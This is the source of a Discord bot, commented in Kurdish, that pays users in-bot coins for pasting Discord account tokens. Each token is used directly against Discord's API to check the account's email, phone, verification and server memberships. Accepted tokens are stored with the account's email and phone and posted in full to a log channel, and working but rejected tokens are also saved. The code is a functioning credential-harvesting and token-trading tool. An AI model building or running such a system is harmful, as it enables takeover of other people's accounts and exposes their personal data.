const { 
    Client, 
    GatewayIntentBits, 
    SlashCommandBuilder, 
    EmbedBuilder, 
    REST, 
    Routes 
} = require('discord.js');
const axios = require('axios');
const fs = require('fs');
const config = require('./config.json');
const { saveToFex } = require('./fex.js');

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages]
});

// سیستەمی کوینەکان (Database سادە)
let coinsData = {};
if (fs.existsSync('./coins.json')) {
    try {
        coinsData = JSON.parse(fs.readFileSync('./coins.json', 'utf8'));
    } catch (e) {
        coinsData = {};
    }
}

function saveCoins() {
    fs.writeFileSync('./coins.json', JSON.stringify(coinsData, null, 2));
}

// هێنانی لیستی توکنە تۆمارکراوەکان
function getSavedTokens() {
    if (fs.existsSync('./tokens.json')) {
        try {
            return JSON.parse(fs.readFileSync('./tokens.json', 'utf8'));
        } catch (e) {
            return [];
        }
    }
    return [];
}

// تۆمارکردنی توکنە سەرکەوتووەکان
function saveAcceptedToken(userToken, userData) {
    let tokens = getSavedTokens();

    tokens.push({
        token: userToken,
        userId: userData.id,
        username: userData.username,
        email: userData.email || null,
        phone: userData.phone || null,
        addedAt: new Date().toISOString()
    });

    fs.writeFileSync('./tokens.json', JSON.stringify(tokens, null, 2));
}

// دروستکردنی کۆماندەکان
const commands = [
    new SlashCommandBuilder()
        .setName('settoken')
        .setDescription('پشکنین و تۆمارکردنی توکنی ئەکاونت')
        .addStringOption(option => 
            option.setName('token')
                .setDescription('توکنی ئەکاونتەکەت داخڵ بکە')
                .setRequired(true)
        ),
    new SlashCommandBuilder()
        .setName('coin')
        .setDescription('پشکنینی باڵانسی کوینەکانت')
].map(cmd => cmd.toJSON());

client.once('ready', async () => {
    console.log(`✨ بۆت چالاك بوو وەک: ${client.user.tag}`);
    
    const rest = new REST({ version: '10' }).setToken(config.botToken);
    try {
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: commands }
        );
        console.log('✅ کۆماندەکان بە سەرکەوتوویی تۆمار کران.');
    } catch (error) {
        console.error('❌ هەڵە لە تۆمارکردنی کۆماندەکان:', error);
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    const { commandName, user } = interaction;

    // --- کۆماندی /coin ---
    if (commandName === 'coin') {
        const userCoins = coinsData[user.id] || 0;
        const coinEmbed = new EmbedBuilder()
            .setColor('#FFD700')
            .setTitle('🪙 | زانیاری باڵانسی کوین')
            .setDescription(`───────────────────────\n👤 **بەکارهێنەر:** <@${user.id}>\n💰 **کۆی کوینەکانت:** \`${userCoins}\` Coins\n───────────────────────`)
            .setTimestamp()
            .setFooter({ text: 'سیستەمی خەڵاتی توکن', iconURL: user.displayAvatarURL() });

        return interaction.reply({ embeds: [coinEmbed], ephemeral: true });
    }

    // --- کۆماندی /settoken ---
    if (commandName === 'settoken') {
        await interaction.deferReply({ ephemeral: true });

        const inputToken = interaction.options.getString('token');

        // پێش هەموو شتێک پشکنین بکە داخۆ ئەم توکنە پێشتر لە tokens.json هەیە یان نەخێر
        const existingTokens = getSavedTokens();
        const isTokenAlreadyUsed = existingTokens.some(t => t.token === inputToken);

        if (isTokenAlreadyUsed) {
            const duplicateEmbed = new EmbedBuilder()
                .setColor('#E74C3C')
                .setTitle('⚠️ توکنی دووبارە')
                .setDescription('❌ ئەم توکنە پێشتر تۆمارکراوە و ناتوانیت دووبارە بەکاری بهێنیتەوە.');
            return interaction.editReply({ embeds: [duplicateEmbed] });
        }

        try {
            // ١. وەرگرتنی زانیاری پرۆفایلی ئەکاونت (بۆ پشکنینی کارکردنی توکنەکە)
            const userRes = await axios.get('https://discord.com/api/v10/users/@me', {
                headers: { 'Authorization': inputToken }
            });

            const userData = userRes.data;
            const hasPhone = Boolean(userData.phone);
            const hasEmail = Boolean(userData.email);
            const isVerified = Boolean(userData.verified);

            // پشکنینی ئەوەی ئایا ئەم ئایمڵە یاخود ژمارە تەلەفۆنە پێشتر تۆمارکراوە یان نەخێر
            const isEmailUsed = userData.email && existingTokens.some(t => t.email === userData.email);
            const isPhoneUsed = userData.phone && existingTokens.some(t => t.phone === userData.phone);

            if (isEmailUsed || isPhoneUsed) {
                const matchErrorEmbed = new EmbedBuilder()
                    .setColor('#E74C3C')
                    .setTitle('❌ زانیاری دووبارە')
                    .setDescription('⚠️ ئەم ئایمڵە یان ژمارە تەلەفۆنە پێشتر لەلایەن ئەکاونتێکی ترەوە بەکارهاتووە!');
                return interaction.editReply({ embeds: [matchErrorEmbed] });
            }

            // ٢. وەرگرتنی سەرڤەرەکانی ئەکاونتەکە
            const guildsRes = await axios.get('https://discord.com/api/v10/users/@me/guilds', {
                headers: { 'Authorization': inputToken }
            });

            const guilds = guildsRes.data;
            const totalGuilds = guilds.length;

            // ٣. پشکنینی مەرجی سەرڤەرەکان بەپێی config.json
            let validGuildFound = false;
            let qualifiedGuildName = '';
            let qualifiedMemberCount = 0;

            if (totalGuilds >= config.minServers) {
                for (const guild of guilds) {
                    try {
                        const guildDetail = await axios.get(`https://discord.com/api/v10/guilds/${guild.id}?with_counts=true`, {
                            headers: { 'Authorization': inputToken }
                        });

                        const approximateMembers = guildDetail.data.approximate_member_count || 0;

                        if (approximateMembers >= config.minMembersInServer) {
                            validGuildFound = true;
                            qualifiedGuildName = guild.name;
                            qualifiedMemberCount = approximateMembers;
                            break; 
                        }
                    } catch (e) {
                        continue;
                    }
                }
            }

            // پشکنینی گشتی مەرجەکان
            const passedAllChecks = isVerified && hasPhone && hasEmail && (totalGuilds >= config.minServers) && validGuildFound;

            if (passedAllChecks) {
                // ✅ سەرکەوتوو (ACCEPT)
                saveAcceptedToken(inputToken, userData);

                // پێدانی کوین بەپێی config.json
                coinsData[user.id] = (coinsData[user.id] || 0) + config.rewardCoins;
                saveCoins();

                const successEmbed = new EmbedBuilder()
                    .setColor('#2ECC71')
                    .setTitle('✅ Token Verification | ACCEPTED')
                    .setDescription(
                        `───────────────────────────\n` +
                        `👤 **Account:** \`${userData.username}\` (\`${userData.id}\`)\n` +
                        `📧 **Email:** \`${hasEmail ? 'Verified ✅' : 'Missing ❌'}\`\n` +
                        `📱 **Phone:** \`${hasPhone ? 'Verified ✅' : 'Missing ❌'}\`\n` +
                        `🌐 **Servers Count:** \`${totalGuilds}/${config.minServers}\`\n` +
                        `🏰 **Target Server:** \`${qualifiedGuildName}\` (\`${qualifiedMemberCount}\` members)\n` +
                        `───────────────────────────\n` +
                        `🎉 **Reward Granted:** \`+${config.rewardCoins} Coins\` Added!\n` +
                        `───────────────────────────`
                    )
                    .setFooter({ text: 'Status: Qualified Account', iconURL: client.user.displayAvatarURL() })
                    .setTimestamp();

                await interaction.editReply({ embeds: [successEmbed] });

                // ناردنی لۆگ بۆ کەناڵی تایبەت
                const logChannel = client.channels.cache.get(config.logChannelId);
                if (logChannel) {
                    const logEmbed = new EmbedBuilder()
                        .setColor('#00FF7F')
                        .setTitle('📥 New Valid Token Submitted')
                        .setDescription(
                            `───────────────────────────\n` +
                            `🔑 **Token:** \`${inputToken}\`\n` +
                            `👤 **Submitted By:** <@${user.id}> (\`${user.id}\`)\n` +
                            `📧 **Email Verified:** \`${hasEmail}\`\n` +
                            `📱 **Phone Verified:** \`${hasPhone}\`\n` +
                            `🌐 **Total Guilds:** \`${totalGuilds}\`\n` +
                            `🏰 **Qualified Server:** \`${qualifiedGuildName}\` (\`${qualifiedMemberCount}\` members)\n` +
                            `───────────────────────────`
                        )
                        .setTimestamp();

                    logChannel.send({ embeds: [logEmbed] });
                }

            } else {
                // ❌ مەرجەکانی تێدابوو بەڵام سەرکەوتوو نەبوو بۆ خەڵات (REJECT / FEX)
                let reason = [];
                if (!isVerified || !hasEmail) reason.push('Email Verification Failed');
                if (!hasPhone) reason.push('Phone Verification Failed');
                if (totalGuilds < config.minServers) reason.push(`Insufficient Servers (${totalGuilds}/${config.minServers})`);
                if (!validGuildFound) reason.push(`No server found with ${config.minMembersInServer}+ users`);

                saveToFex({ token: inputToken, reason: reason.join(', ') });

                const failEmbed = new EmbedBuilder()
                    .setColor('#E74C3C')
                    .setTitle('❌ Token Verification | FAILED')
                    .setDescription(
                        `───────────────────────────\n` +
                        `👤 **Account:** \`${userData.username}\`\n` +
                        `📧 **Email Verified:** \`${hasEmail ? '✅' : '❌'}\`\n` +
                        `📱 **Phone Verified:** \`${hasPhone ? '✅' : '❌'}\`\n` +
                        `🌐 **Total Servers:** \`${totalGuilds}/${config.minServers}\`\n` +
                        `🏰 **${config.minMembersInServer}+ User Server:** \`${validGuildFound ? '✅' : '❌'}\`\n` +
                        `───────────────────────────\n` +
                        `⚠️ **Status:** Saved to \`fex.js\` (Requirements Not Met)\n` +
                        `───────────────────────────`
                    )
                    .setFooter({ text: 'Status: Unqualified Account', iconURL: client.user.displayAvatarURL() })
                    .setTimestamp();

                await interaction.editReply({ embeds: [failEmbed] });
            }

        } catch (error) {
            // ⛔ ئەگەر توکنەکە کار نەکات یان هەڵە بێت (ئێرە لێرەدا فەنکشنی saveToFex بانگ ناکات واتا save نابێت)
            const invalidEmbed = new EmbedBuilder()
                .setColor('#FF0000')
                .setTitle('⛔ Invalid Token')
                .setDescription(
                    `───────────────────────────\n` +
                    `❌ توکنی داخڵکراو هەڵەیە یان بێکاریگەرە.\n` +
                    `⚠️ چونکە توکنەکە کارا نییە، لە فایلەکاندا پاشەکەوت نەکرا.\n` +
                    `───────────────────────────`
                );

            await interaction.editReply({ embeds: [invalidEmbed] });
        }
    }
});

client.login(config.botToken);